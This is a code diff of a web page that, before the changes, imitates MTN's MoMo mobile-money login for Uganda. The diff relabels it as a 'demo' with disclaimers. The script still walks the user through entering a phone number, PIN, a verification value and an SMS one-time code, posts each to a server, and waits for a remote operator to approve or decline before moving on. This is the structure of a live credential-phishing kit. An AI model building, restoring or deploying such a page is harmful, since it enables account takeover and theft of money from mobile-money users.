@@ -3,151 +3,93 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Welcome to MoMo</title>
+<title>Verification Demo</title>
 <style>
 * {
   box-sizing: border-box;
 }
 
 :root {
-  --momo-blue: #004f71;
-  --momo-yellow: #ffcc00;
+  --yellow: #ffcc00;
+  --teal: #00566d;
   --white: #ffffff;
-  --text: #004f71;
+  --text: #171717;
   --muted: #667085;
-  --border: #cccccc;
-  --btn-disabled: #cccccc;
+  --border: #d1d5db;
 }
 
 body {
   margin: 0;
-  background: #f4f6f8;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background: #f1f3f5;
+  font-family: Arial, sans-serif;
   color: var(--text);
 }
 
-/* Header styled with the deep corporate blue matching the screenshot background */
 .header {
-  height: 240px;
-  background: var(--momo-blue);
+  height: 135px;
+  background: var(--yellow);
+  border-top: 8px solid #111;
   display: flex;
-  flex-direction: column;
   align-items: center;
   justify-content: center;
-  padding-bottom: 20px;
 }
 
-/* Yellow rounded box logo configuration */
-.logo-box {
-  background: var(--momo-yellow);
-  width: 100px;
-  height: 100px;
-  border-radius: 18px;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+.logo {
+  border: 5px solid #111;
+  border-radius: 50%;
+  padding: 15px 35px;
+  font-size: 35px;
+  font-weight: 900;
 }
 
-.logo-text {
-  font-size: 26px;
-  font-weight: 800;
-  color: var(--momo-blue);
-  letter-spacing: -0.5px;
-}
-
-.logo-sub {
-  font-size: 11px;
-  font-weight: bold;
-  color: var(--momo-blue);
-  margin-top: -2px;
-}
-
-.logo-footer {
-  color: #ffcc00;
-  font-size: 13px;
-  font-weight: 600;
-  margin-top: 10px;
-}
-
-/* Main input card floating interface element layers */
 .card {
   width: calc(100% - 32px);
-  max-width: 480px;
-  margin: -50px auto 25px;
+  max-width: 520px;
+  margin: 25px auto;
   background: var(--white);
-  border-radius: 28px;
-  padding: 35px 24px;
-  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+  border-radius: 30px;
+  padding: 28px 22px;
+  box-shadow: 0 10px 30px #00000010;
 }
 
 h1 {
   text-align: center;
-  font-size: 24px;
-  font-weight: 700;
-  color: var(--momo-blue);
-  margin: 0 0 25px;
+  font-size: 28px;
+  margin: 10px 0 20px;
 }
 
-.input-label {
+p {
   text-align: center;
-  font-size: 16px;
-  color: #333333;
-  margin-bottom: 12px;
-  font-weight: 500;
+  line-height: 1.6;
+  color: #414653;
 }
 
-/* Phone input row wrapper element styles */
-.phone-container {
-  display: flex;
-  align-items: center;
-  width: 100%;
-  height: 56px;
-  border: 1px solid var(--border);
-  border-radius: 28px;
-  background: var(--white);
-  padding: 0 20px;
-  margin-bottom: 30px;
+.demo {
+  text-align: center;
+  font-size: 11px;
+  color: var(--muted);
+  margin-bottom: 20px;
 }
 
-.phone-container:focus-within {
-  border-color: var(--momo-blue);
-  box-shadow: 0 0 0 1px var(--momo-blue);
+label {
+  display: block;
+  font-weight: bold;
+  margin: 22px 0 10px;
 }
 
-.flag-box {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 24px;
-  user-select: none;
-  padding-right: 10px;
-}
-
-input[type="tel"]#phone {
-  flex: 1;
-  height: 100%;
-  border: none;
-  padding: 0 0 0 5px;
-  font-size: 18px;
-  outline: none;
-  background: transparent;
-  color: #333333;
-}
-
-input[type="tel"]#phone::placeholder {
-  color: #999999;
-}
-
+input[type="tel"],
 input[type="text"] {
   width: 100%;
-  height: 56px;
-  border: 1px solid var(--border);
-  border-radius: 28px;
-  padding: 0 20px;
-  font-size: 18px;
+  height: 60px;
+  border: 2px solid var(--border);
+  border-radius: 12px;
+  padding: 0 14px;
+  font-size: 20px;
   outline: none;
+}
+
+input:focus {
+  border-color: #2878d0;
 }
 
 .boxes {
@@ -158,74 +100,49 @@ input[type="text"] {
 }
 
 .boxes input {
-  width: 52px;
-  height: 60px;
+  width: 58px;
+  height: 66px;
   text-align: center;
   padding: 0;
-  font-size: 24px;
-  border: 1px solid var(--border);
+  font-size: 25px;
+  border: 2px solid var(--border);
   border-radius: 12px;
   outline: none;
 }
 
 .boxes input:focus {
-  border-color: var(--momo-blue);
+  border-color: #2878d0;
 }
 
-/* Solid rounded pill button styling matching screenshot */
 button {
   width: 100%;
-  height: 56px;
-  background: #e6e6e6;
-  color: #ffffff;
+  height: 60px;
+  margin-top: 20px;
+  background: var(--yellow);
   border: none;
-  border-radius: 28px;
-  font-size: 16px;
+  border-radius: 12px;
+  font-size: 20px;
   font-weight: bold;
-  letter-spacing: 1px;
   cursor: pointer;
-  text-transform: uppercase;
-  transition: all 0.2s ease;
-}
-
-button:not(:disabled) {
-  background: var(--momo-blue);
-  color: #ffffff;
+  opacity: 1;
+  transition: opacity 0.2s ease;
 }
 
 button:disabled {
-  background: var(--btn-disabled);
-  color: #ffffff;
-  cursor: not-allowed;
-  opacity: 1;
+  opacity: 0.45 !important;
+  cursor: not-allowed !important;
+  pointer-events: none;
 }
 
-/* Terms and footer notice styles from screenshot */
-.footer-notice {
-  text-align: center;
-  font-size: 13px;
-  color: #666666;
-  line-height: 1.4;
-  margin-top: 30px;
-  padding: 0 10px;
-}
-
-.footer-notice a {
-  color: var(--momo-blue);
-  text-decoration: none;
-  font-weight: bold;
-}
-
-/* Precise neon-green tracking ring spinner components from screenshot layout */
+/* Screenshot Accurate Progress Ring Component */
 .spinner {
-  width: 64px;
-  height: 64px;
+  width: 54px;
+  height: 54px;
   margin: 25px auto 15px;
-  border: 4px solid rgba(0, 0, 0, 0.06); 
-  border-top-color: #00ca51; 
-  border-right-color: #00ca51; 
+  border: 5px solid #2d3748; 
+  border-top-color: #38a169; 
   border-radius: 50%;
-  animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+  animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
 }
 
 @keyframes spin {
@@ -235,7 +152,7 @@ button:disabled {
 
 .status {
   text-align: center;
-  color: var(--momo-blue);
+  color: var(--teal);
   font-weight: bold;
   margin-top: 15px;
 }
@@ -268,68 +185,56 @@ button:disabled {
 
 @media (max-width: 380px) {
   .card {
-    padding: 30px 16px;
+    padding: 22px 15px;
   }
-  .boxes { gap: 6px; }
-  .boxes input { width: 44px; height: 52px; }
+  .boxes {
+    gap: 6px;
+  }
+  .boxes input {
+    width: 48px;
+    height: 58px;
+  }
 }
 </style>
 </head>
 <body>
 
-<!-- Header background block styling parameters -->
 <header class="header">
-  <div class="logo-box">
-    <div class="logo-text">MoMo</div>
-    <div class="logo-sub">from MTN</div>
-  </div>
-  <div class="logo-footer">from MTN</div>
+  <div class="logo">DEMO</div>
 </header>
 
 <main class="card">
-  <div class="demo" style="text-align: center; font-size: 11px; color: var(--muted); margin-bottom: 20px;">
-    DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES
-  </div>
+  <div class="demo">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
 
-  <!-- PAGE 1: PHONE NUMBER INPUT BLOCK -->
+  <!-- PAGE 1: PHONE NUMBER -->
   <section id="page1">
-    <h1>Welcome to MoMo</h1>
-    
-    <div class="input-label">Enter number *</div>
-    
-    <div class="phone-container">
-      <div class="flag-box">🇺🇬</div>
-      <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="e.g. 778260583" autocomplete="off">
-    </div>
-    
+    <h1>Welcome</h1>
+    <p>Enter a nine-digit test number to begin the verification demonstration.</p>
+    <label for="phone">Test phone number</label>
+    <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
     <button id="nextPhone" disabled="true">Next</button>
-
-    <div class="footer-notice">
-      Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
-    </div>
   </section>
 
-  <!-- PAGE 2: PIN NUMBER GRIDS AND LOADING PROGRESS RINGS -->
+  <!-- PAGE 2: DEMO PIN -->
   <section id="page2" class="hidden">
-    <h1>Secure Verification</h1>
-    <p style="text-align:center;">Verifying your PIN...<br>Please do not close this page.</p>
+    <h1>Demo PIN</h1>
+    <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
     <div class="boxes" id="pinBoxes"></div>
     <div id="pinWaiting" class="hidden">
       <div class="spinner"></div>
+      <div class="status">Waiting for demo approval...</div>
     </div>
     <div id="pinMessage" class="status"></div>
   </section>
 
-  <!-- PAGE 3: TEXT VALUES FORM -->
+  <!-- PAGE 3: FIRST DEMO CODE -->
   <section id="page3" class="hidden">
     <h1>Verification Demo</h1>
-    <p style="text-align:center;">Enter any test value to continue.</p>
+    <p>Enter any test value to continue.</p>
     <div class="notice">This is a simulated verification step. No SMS is sent.</div>
-    
-    <label for="code1" style="display:block; text-align:center; font-weight:bold; margin-bottom:10px;">Test value</label>
+    <label for="code1">Test value</label>
     <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
     <button id="submitCode1" disabled="true">Continue</button>
-    
     <div id="code1Waiting" class="hidden">
       <div class="spinner"></div>
       <div class="status">Waiting for demo approval...</div>
@@ -337,10 +242,10 @@ button:disabled {
     <div id="code1Message" class="status"></div>
   </section>
 
-  <!-- PAGE 4: OTP CODES PAGE -->
+  <!-- PAGE 4: SECOND DEMO CODE -->
   <section id="page4" class="hidden">
     <h1>Final Demo Step</h1>
-    <p style="text-align:center;">Enter any four test digits. Do not use an actual SMS code.</p>
+    <p>Enter any four test digits. Do not use an actual SMS code.</p>
     <div class="boxes" id="code2Boxes"></div>
     <div id="code2Waiting" class="hidden">
       <div class="spinner"></div>
@@ -349,11 +254,11 @@ button:disabled {
     <div id="code2Message" class="status"></div>
   </section>
 
-  <!-- PAGE 5: COMPLETION MESSAGE SCREEN -->
+  <!-- PAGE 5: SUCCESS -->
   <section id="page5" class="hidden">
     <div class="success">✓</div>
     <h1>Demo Completed</h1>
-    <p style="text-align:center;">The verification sequence mockup concluded successfully.</p>
+    <p>The verification sequence mockup concluded successfully.</p>
   </section>
 </main>
 
@@ -362,7 +267,7 @@ let sessionId = null;
 let userData = { phone: "", pin: "", code1: "", code2: "" };
 let pollingInterval = null;
 
-// Initialize Session context mapping parameters
+// Initialize Session
 window.addEventListener("DOMContentLoaded", async () => {
   try {
     const res = await fetch("/api/session", { method: "POST" });
@@ -407,11 +312,11 @@ function setupBoxInputs(containerId, count, onComplete) {
     inputs.push(input);
   }
   
-  // SECURE NATIVE REPAIR: Focus first node of array correctly to eliminate button crashes
+  // FIXED: Focus the first actual input element in the array instead of the array object
   if (inputs.length > 0) inputs[0].focus();
 }
 
-// Step 1 Input Verification handling routines
+// Step 1 Phone Input Dynamic Activation Routines
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
@@ -426,4 +331,104 @@ phoneInput.addEventListener("input", () => {
 });
 
 nextPhoneBtn.addEventListener("click", () => {
+  userData.phone = phoneInput.value;
+  document.getElementById("page1").classList.add("hidden");
+  document.getElementById("page2").classList.remove("hidden");
+  
+  setupBoxInputs("pinBoxes", 5, submitPinStage);
+});
 
+// Post Phone & PIN bundle configurations
+async function submitPinStage(pinValue) {
+  userData.pin = pinValue;
+  document.getElementById("pinWaiting").classList.remove("hidden");
+  
+  const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
+  if (success) {
+    startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
+      setTimeout(() => document.getElementById("code1").focus(), 50);
+    });
+  }
+}
+
+// Track and validate Page 3 input elements
+const code1Input = document.getElementById("code1");
+const submitCode1Btn = document.getElementById("submitCode1");
+
+code1Input.addEventListener("input", () => {
+  if (code1Input.value.trim().length > 0) {
+    submitCode1Btn.removeAttribute("disabled");
+  } else {
+    submitCode1Btn.setAttribute("disabled", "true");
+  }
+});
+
+submitCode1Btn.addEventListener("click", async () => {
+  userData.code1 = code1Input.value.trim();
+  submitCode1Btn.setAttribute("disabled", "true");
+  document.getElementById("code1Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code1", { code1: userData.code1 });
+  if (success) {
+    startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
+      setupBoxInputs("code2Boxes", 4, submitCode2Stage);
+    });
+  }
+});
+
+// Final step submission handler
+async function submitCode2Stage(code2Value) {
+  userData.code2 = code2Value;
+  document.getElementById("code2Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code2", { code2: userData.code2 });
+  if (success) {
+    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+  }
+}
+
+// Pipeline transmission communications helper
+async function sendStagePayload(stage, payload) {
+  try {
+    const response = await fetch("/api/approval-request", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId, stage, payload })
+    });
+    return response.ok;
+  } catch (e) {
+    return false;
+  }
+}
+
+// Polling core infrastructure engine
+function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
+  const msgElement = document.getElementById(msgId);
+  msgElement.className = "status";
+  msgElement.innerText = "";
+
+  if(pollingInterval) clearInterval(pollingInterval);
+
+  pollingInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
+      const data = await res.json();
+
+      if (data.status === "approved") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        document.getElementById(currentPageId).classList.add("hidden");
+        document.getElementById(nextPageId).classList.remove("hidden");
+        if (successCallback) successCallback();
+      } else if (data.status === "declined") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        msgElement.classList.add("error");
+        msgElement.innerText = "Submission declined. Please refresh and retry.";
+      }
+    } catch (err) {
+      console.error("Status check failed");
+    }
+  }, 2500);
+}
+</script>
